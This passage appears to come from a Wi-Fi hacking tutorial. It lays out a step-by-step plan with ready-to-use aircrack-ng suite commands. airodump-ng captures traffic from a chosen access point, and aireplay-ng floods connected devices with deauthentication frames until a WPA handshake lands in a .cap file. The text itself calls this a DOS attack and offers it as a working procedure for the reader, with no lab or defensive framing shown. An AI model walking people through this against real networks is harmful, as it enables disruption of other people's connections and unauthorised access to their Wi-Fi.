Now here’s the game plan:
1. - Setup airodump-ng to capture packets and save them
`sudo airodump-ng -c <channel number> --bssid <AP BSSID> <network interface> -w <path for saved packets file>`
2. - While that is running, you’re going to run your de-authentication attack against the device connected to it using the command:
`sudo aireplay-ng -a <BSSID of the AP> --deauth <time> <network interface>`
3. - While the DOS attack is underway, check on your airodump scan. You should see at the right top : WPA handshake: <mac address>. Once you have verified that, you can stop the replay attack and the airodump-ng scan.
4. - great now you have a file.cap !!!
